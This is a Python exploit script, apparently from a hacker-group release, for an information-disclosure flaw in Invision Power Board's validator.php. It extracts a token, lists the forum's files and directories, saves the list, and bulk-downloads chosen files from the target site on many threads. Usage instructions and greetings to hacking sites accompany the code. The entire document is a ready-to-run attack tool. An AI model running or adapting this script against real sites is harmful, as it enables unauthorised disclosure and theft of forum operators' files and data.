#! /usr/bin/env python3.1 
 
################################################################ 
# 	         _____ _____  ____  (validator.php)            # 
#	        |_   _|  __ \|  _ \                            # 
#		  | | | |__) | |_) |                           # 
# 		  | | |  ___/|  _ <                            # 
# 	 	 _| |_| |    | |_) |                           # 
#   		|_____|_|    |____/                            # 
#                                   @expl0it...                # 
################################################################ 
#          [ IPB Files / Directories Full Disclosure ]         # 
#    [ Vuln discovered by TinKode / xpl0it written by cmiN ]   # 
#           [ Greetz: insecurity.ro, darkc0de.com ]            # 
################################################################ 
#                                                              # 
#                 Special thanks for: cmiN                     # 
#                 www.TinKode.BayWords.com                     # 
################################################################ 
 
 
import os, sys, urllib.request, urllib.parse, threading 
 
 
def main(): 
    logo = """ 
\t |---------------------------------------------------------------| 
\t |                      _____ _____  ____    (TM)                | 
\t |                     |_   _|  __ \|  _ \                       | 
\t |                       | | | |__) | |_) |                      | 
\t |                       | | |  ___/|  _ <                       | 
\t |                      _| |_| |    | |_) |                      | 
\t |                     |_____|_|    |____/                       | 
\t |                                                               | 
\t |                                                               | 
\t |                  IPB Full Disclosure expl0it                  | 
\t |                      Written by cmiN                          | 
\t |              Vulnerability discovered by TinKode              | 
\t |                                                               | 
\t |                                                               | 
\t |         Visit: www.insecurity.ro & www.darkc0de.com           | 
\t |---------------------------------------------------------------| 
""" 
    usage = """ 
         |---------------------------------------------------------------| 
         |Usage:  ipbfd.py scan http://www.site.com/IPB_folder           | 
         |        ipbfd.py download *.zip -> all                         | 
         |        ipbfd.py download name.jpg -> one                      | 
         |---------------------------------------------------------------|""" 
    if sys.platform in ("linux", "linux2"): 
        clearing = "clear" 
    else: 
        clearing = "cls" 
    os.system(clearing) 
    print(logo) 
    args = sys.argv 
    if len(args) == 3: 
        try: 
            print("Please wait...") 
            if args[1] == "scan": 
                extract_parse_save(args[2].strip("/")) 
            elif args[1] == "download": 
                download_data(args[2]) 
        except Exception as message: 
            print("An error occurred: {}".format(message)) 
        except: 
            print("Unknown error.") 
        else: 
            print("Ready!") 
    else: 
        print(usage) 
    input() 
 
 
def extract_parse_save(url): 
    print("[+]Extracting content...") 
    hurl = url + "/validator.php" 
    with urllib.request.urlopen(hurl) as usock: 
        source = usock.read().decode() 
    print("[+]Finding token...") 
    word = "validate('" 
    index = source.find(word) 
    if index != -1: 
        source = source[index + len(word):] 
        value = source[:source.index("'")] 
        hurl = url + "/validator.php?op={}".format(value) 
    else: 
        print("[!]Token not found.") 
    print("[+]Obtaining paths...") 
    with urllib.request.urlopen(hurl) as usock: 
        lastk, lastv = None, None 
        dictionary = dict() 
        for line in usock: 
            line = line.decode() 
            index = line.find("<td>") 
            if index != -1: 
                lastk = line[index + 4:line.index("</td>")].strip(" ").strip("&nbsp;") 
            index = line.find("<strong>") 
            if index != -1: 
                lastv = line[index + 8:line.index("</strong>")].strip(" ") 
            if lastk != None and lastv != None: 
                index = lastk.rfind(".") 
                if index in (-1, 0): 
                    lastk = "[other] {}".format(lastk) 
                else: 
                    lastk = "[{}] {}".format(lastk[index + 1:], lastk) 
                dictionary[lastk] = lastv 
                lastk, lastv = None, None 
    print("[+]Organizing and saving paths...") 
    with open("IPBlogs.txt", "w") as fout: 
        fout.write(url + "\n") 
        keys = sorted(dictionary.keys()) 
        for key in keys: 
            fout.write("{} ({})\n".format(key, dictionary[key])) 
 
 
def download_data(files): 
    print("[+]Searching and downloading files...") 
    mthreads = 50 
    with open("IPBlogs.txt", "r") as fin: 
        url = fin.readline().strip("\n").strip("/") 
        if files.find("*") == -1: 
            hurl = url + "/" + files.strip("/") 
            Download(hurl).start() 
        else: 
            ext = files[files.rindex(".") + 1:] 
            for line in fin: 
                pieces = line.strip("\n").split(" ") 
                if pieces[0].count(ext) == 1: 
                    upath = pieces[1] 
                    hurl = url + "/" + upath.strip("/") 
                    while threading.active_count() > mthreads: 
                        pass 
                    Download(hurl).start() 
    while threading.active_count() > 1: 
        pass 
 
 
class Download(threading.Thread): 
 
    def __init__(self, url): 
        threading.Thread.__init__(self) 
        self.url = url 
 
    def run(self): 
        try: 
            with urllib.request.urlopen(self.url) as usock: 
                data = usock.read() 
                uparser = urllib.parse.urlparse(usock.geturl()) 
                pieces = uparser.path.split("/") 
                fname = pieces[len(pieces) - 1] 
                with open(fname, "wb") as fout: 
                    fout.write(data) 
        except: 
            pass 
 
 
if __name__ == "__main__": 
    main()
